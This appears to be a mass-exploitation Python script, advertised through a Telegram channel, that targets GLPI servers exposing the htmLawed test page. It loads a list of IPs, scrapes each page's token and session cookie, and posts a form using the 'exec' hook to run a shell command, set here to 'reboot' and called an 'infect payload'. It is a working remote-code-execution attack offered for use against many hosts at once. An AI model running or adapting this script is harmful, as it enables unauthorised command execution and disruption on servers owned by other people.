#New exploit: https://t.me/devddos
#New exploit: https://t.me/devddos
#New exploit: https://t.me/devddos
#New exploit: https://t.me/devddos

import httpx, re, threading, sys, time
from bs4 import BeautifulSoup


def exploit(ip):
    try:
        print(f"Attempting to infect -> {ip}")
        url = f"https://{ip}/vendor/htmlawed/htmlawed/htmLawedTest.php"
        cmd = 'reboot' # Infect Payload.

        session = httpx.Client()
        response_part1 = session.get(url, verify=False)
        if (response_part1.status_code != 200):
            pass
        
        soup = BeautifulSoup(response_part1.text, 'html.parser')
        if (soup.title.text.find("htmLawed") == -1):
            pass

        # Lets Execute The Payload
        token_value = soup.find_all(id='token')[0]['value']
        sid_value = session.cookies.get("sid")
        body = {"token":token_value,"text":cmd,"hhook":'exec',"sid":sid_value}
        session.post(url, verify=False, data=body)
        return
    except:
        pass


def main():
    ips = open("glpi.txt", 'r')
    for ip in ips:
        threading.Thread(target=exploit, args=(ip, )).start()
        
main()